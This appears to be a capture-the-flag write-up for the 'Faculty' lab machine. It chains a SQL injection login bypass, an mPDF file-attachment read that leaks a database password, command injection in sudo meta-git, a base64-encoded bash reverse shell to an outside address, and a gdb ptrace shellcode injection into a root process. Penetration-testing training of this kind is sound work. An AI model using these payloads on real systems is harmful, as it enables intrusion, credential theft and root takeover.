## Faculty

### Lab Details 

- Difficulty: Medium
- Type: Web Enumeration, SQLi, LFI, Linux

#### Enumeration
- run nmap
- unable to find other subdomain
- `feroxbuster` found `http://faculty.htb/admin/login.php`
- search online for web app with the name `School Faculty Scheduling System` and found source code (https://www.sourcecodester.com/php/14535/school-faculty-scheduling-system-using-phpmysqli-source-code.html)
- check `admin_class.php` and found the login function
```php
function login(){
		
			extract($_POST);		
			$qry = $this->db->query("SELECT * FROM users where username = '".$username."' and password = '".md5($password)."' ");
			if($qry->num_rows > 0){
				foreach ($qry->fetch_array() as $key => $value) {
					if($key != 'password' && !is_numeric($key))
						$_SESSION['login_'.$key] = $value;
				}
				if($_SESSION['login_type'] != 1){
					foreach ($_SESSION as $key => $value) {
						unset($_SESSION[$key]);
					}
					return 2 ;
					exit;
				}
					return 1;
			}else{
				return 3;
			}
	}
```
- we can perform `SQLi` to bypass the login, payload: `admin' -- -`
- checking out the functionalities
- we can add a new course and generate a `pdf` file from the list of courses
![[mpdf version.png]]
- search online found (https://www.cybersecurity-help.cz/vdb/SB2019020703)
- attempt exploiting the vulnerability and got remote connection 
- confirmed `SSRF` exist via adding a new course
![[Medium/Unix/Faculty/ssrf.png]]
```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.37] from (UNKNOWN) [10.10.14.37] 58728
GET / HTTP/1.1
Host: 10.10.14.37:4444
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://faculty.htb/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

```
- however unable to perform further actions with `SSRF`
- further digging online found git issue with allowing remote files to be attached to the generated `pdf` (https://github.com/mpdf/mpdf/issues/356)
- looking through the source code found `db_connect.php` which contains database connection details 
- we can attempt to fetch it from remote with payload
```html
<annotation file="db_connect.php" content="db_connect.php"  icon="Graph" title="Attached File: db_connect.php" pos-x="195" />
```
![[LFI.png]]
```php
<?php 

$conn= new mysqli('localhost','sched','Co.met06aci.dly53ro.per','scheduling_db')or die("Could not connect to mysql".mysqli_error($con));
```
#### Initial Foothold
- we can ssh into remote using `gbyolo` with the database password

#### Lateral Movement (If any)
- run `sudo -l`
- searched online for `meta-git` found CVE that allows for RCE (https://hackerone.com/reports/728040)
- tested it with creating a file as developer and worked 
```bash
gbyolo@faculty:/tmp$ sudo -u developer meta-git clone 'sss||touch HACKED'
meta git cloning into 'sss||touch HACKED' at sss||touch HACKED

sss||touch HACKED:
fatal: repository 'sss' does not exist
sss||touch HACKED ✓
(node:31718) UnhandledPromiseRejectionWarning: Error: ENOENT: no such file or directory, chdir '/tmp/sss||touch HACKED'
    at process.chdir (internal/process/main_thread_only.js:31:12)
    at exec (/usr/local/lib/node_modules/meta-git/bin/meta-git-clone:27:11)
    at execPromise.then.catch.errorMessage (/usr/local/lib/node_modules/meta-git/node_modules/meta-exec/index.js:104:22)
    at process._tickCallback (internal/process/next_tick.js:68:7)
    at Function.Module.runMain (internal/modules/cjs/loader.js:834:11)
    at startup (internal/bootstrap/node.js:283:19)
    at bootstrapNodeJSCore (internal/bootstrap/node.js:623:3)
(node:31718) UnhandledPromiseRejectionWarning: Unhandled promise rejection. This error originated either by throwing inside of an async function without a catch block, or by rejecting a promise which was not handled with .catch(). (rejection id: 1)
(node:31718) [DEP0018] DeprecationWarning: Unhandled promise rejections are deprecated. In the future, promise rejections that are not handled will terminate the Node.js process with a non-zero exit code.
gbyolo@faculty:/tmp$ ls
HACKED                                                                            systemd-private-04a2b7e9797042deb4924417bd7bba7b-systemd-timesyncd.service-fiti1g
sss                                                                               tmp.rDdvpkOK1D
systemd-private-04a2b7e9797042deb4924417bd7bba7b-ModemManager.service-WI8Nmi      tmux-1000
systemd-private-04a2b7e9797042deb4924417bd7bba7b-systemd-logind.service-7jWu4h    vmware-root_660-2697467306
systemd-private-04a2b7e9797042deb4924417bd7bba7b-systemd-resolved.service-OWFxsg
gbyolo@faculty:/tmp$ ls -la
total 56
drwxrwxrwt 14 root      root      4096 Sep  7 18:25 .
drwxr-xr-x 19 root      root      4096 Jun 23  2022 ..
drwxrwxrwt  2 root      root      4096 Sep  7 17:45 .ICE-unix
drwxrwxrwt  2 root      root      4096 Sep  7 17:45 .Test-unix
drwxrwxrwt  2 root      root      4096 Sep  7 17:45 .X11-unix
drwxrwxrwt  2 root      root      4096 Sep  7 17:45 .XIM-unix
drwxrwxrwt  2 root      root      4096 Sep  7 17:45 .font-unix
-rw-rw-r--  1 developer developer    0 Sep  7 18:25 HACKED
-rw-rw-r--  1 developer developer    0 Sep  7 18:25 sss
drwx------  3 root      root      4096 Sep  7 17:45 systemd-private-04a2b7e9797042deb4924417bd7bba7b-ModemManager.service-WI8Nmi
drwx------  3 root      root      4096 Sep  7 17:45 systemd-private-04a2b7e9797042deb4924417bd7bba7b-systemd-logind.service-7jWu4h
drwx------  3 root      root      4096 Sep  7 17:45 systemd-private-04a2b7e9797042deb4924417bd7bba7b-systemd-resolved.service-OWFxsg
drwx------  3 root      root      4096 Sep  7 17:45 systemd-private-04a2b7e9797042deb4924417bd7bba7b-systemd-timesyncd.service-fiti1g
drwx------  2 gbyolo    gbyolo    4096 Sep  7 18:17 tmp.rDdvpkOK1D
drwx------  2 gbyolo    gbyolo    4096 Sep  7 18:11 tmux-1000
drwx------  2 root      root      4096 Sep  7 17:45 vmware-root_660-2697467306
```
- get reverse shell as developer, first create file contains a reverse shell
```bash
gbyolo@faculty:/tmp$ cat ./shellsh
#!/bin/bash
echo -n YmFzaCAtYyAnYmFzaCAgIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjM3LzQ0NDQgICAwPiYxJw== | base64 -d | bash


gbyolo@faculty:/tmp$ sudo -u developer meta-git clone 'sss || ./shell.sh'
meta git cloning into 'sss || ./shell.sh' at shell.sh

shell.sh:
fatal: destination path 'sss' already exists and is not an empty directory.

## nc listener 
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.37] from (UNKNOWN) [10.129.173.70] 48224
developer@faculty:/tmp$ whoami
whoami
developer

```

#### Privilege Escalation
- login as developer to remote using ssh by getting developers private ssh key at `~/.ssh/id_rsa` from the reverse shell
- first check the group permissions of developer user
```bash
developer@faculty:~$ groups
developer debug faculty
developer@faculty:~$ find / -group debug 2>/dev/null
/usr/bin/gdb
developer@faculty:~$ ls -la /usr/bin/gdb
-rwxr-x--- 1 root debug 8440200 Dec  8  2021 /usr/bin/gdb
```
- we see that the developer user belongs to `debug` group and `debug` group has execute permission with `gdb`
- check the capability, `/usr/bin/gdb` has the `CAP_SYS_PTRACE` capability enabled which means we can use `gdb` to attach to any running process
```bash
developer@faculty:~$ getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/gdb = cap_sys_ptrace+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
```
- get running processes
```bash
developer@faculty:~$ ps auxwww
<snip>
root         913  0.0  1.0 194680 20228 ?        Ss   17:45   0:00 php-fpm: master process (/etc/php/7.4/fpm/php-fpm.conf)
<snip>
```
- create a reverse shell payload to get executed with the root process
```bash
developer@faculty:~$ cat shell.gdb 

set {long}$rip = 0x9090909090909090
set {long}($rip+8) = 0x3148d23148c03148
set {long}($rip+16) = 0x026a58296ac6fff6
set {long}($rip+24) = 0x66026a9748050f5f
set {long}($rip+32) = 0x5e54e015022444c7
set {long}($rip+40) = 0x0f5a106a58316a52
set {long}($rip+48) = 0x6a050f58326a5e05
set {long}($rip+56) = 0x036a9748050f582b
set {long}($rip+64) = 0x75050f21b0ceff5e
set {long}($rip+72) = 0x622fbb4852e6f7f8
set {long}($rip+80) = 0x485368732f2f6e69
set {long}($rip+88) = 0x90050f3bb0243c8d
set $rip=$rip+0x04
c
```
- payload (https://www.exploit-db.com/exploits/41128)
 ```bash
developer@faculty:~$ gdb -p 913 -x ./shell.gdb &
[4] 65708
developer@faculty:~$ GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word".
Attaching to process 913
Reading symbols from /usr/sbin/php-fpm7.4...
(No debugging symbols found in /usr/sbin/php-fpm7.4)
Reading symbols from /lib64/ld-linux-x86-64.so.2...
Reading symbols from /usr/lib/debug/.build-id/45/87364908de169dec62ffa538170118c1c3a078.debug...
0x00007f7fe8cb242a in _start () from /lib64/ld-linux-x86-64.so.2
process 913 is executing new program: /usr/bin/dash
 ```
- confirm payload has been created successfully
```bash
developer@faculty:~/.ssh$ netstat -tuln
netstat -tuln
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:5600            0.0.0.0:*               LISTEN     
tcp6       0      0 :::80                   :::*                    LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
tcp6       0      0 ::1:25                  :::*                    LISTEN     
udp        0      0 127.0.0.53:53           0.0.0.0:*                          
udp        0      0 0.0.0.0:68              0.0.0.0:*                      
```
- we can connect to the root process with `nc`
```
developer@faculty:~/.ssh$ nc localhost 5600
nc localhost 5600
whoami
root
ls /root
check_cron.sh
root.txt
service_check.sh
```
#### Resources

#### Lesson Learned
